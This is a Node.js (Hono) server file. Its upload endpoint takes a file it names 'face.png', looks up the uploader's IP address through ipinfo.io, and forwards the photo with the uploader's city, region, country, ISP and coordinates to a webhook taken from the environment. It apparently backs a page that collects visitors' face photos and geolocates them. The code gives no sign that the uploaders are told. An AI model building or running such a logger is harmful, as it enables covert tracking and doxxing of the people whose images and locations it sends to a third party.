import { serve } from "@hono/node-server";
import { Hono } from "hono";
import { serveStatic } from "@hono/node-server/serve-static";
import { getConnInfo } from '@hono/node-server/conninfo'
import dotenv from "dotenv";
import fs from "fs";
dotenv.config();

const app = new Hono();

app.post("/upload", async (c) => {
  const formData = await c.req.formData();
  const file = formData.get("file");
  const info = getConnInfo(c);
  if (!file) {
    return c.text("No file uploaded", 400);
  }

  const ip = process.env["USE_X_FORWARDED_FOR"] === "true" ? c.req.header("cf-connecting-ip").split(",")[0].trim() : info.remote.address;

  const ipInfoJson = await (await fetch(`https://ipinfo.io/${ip}/json`)).json();

  const message = `IP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\位置: ${ipInfoJson.loc}`;

  const buffer = await file.arrayBuffer();

  const fd = new FormData();
  fd.append("file", new Blob([buffer]), "face.png");
  fd.append("payload_json", JSON.stringify({ content: message }));

  const response = await fetch(process.env.WEBHOOK_URL, {
    method: "POST",
    body: fd,
  });
  if (!response.ok) {
    return c.text("Failed to upload file", 500);
  }

  return c.text("Done");
});

app.get('*', serveStatic({ root: './dist' }));

app.port = process.env.PORT || 3000;

serve(app, (p) => console.log(`Server running at http://localhost:${p.port}`));
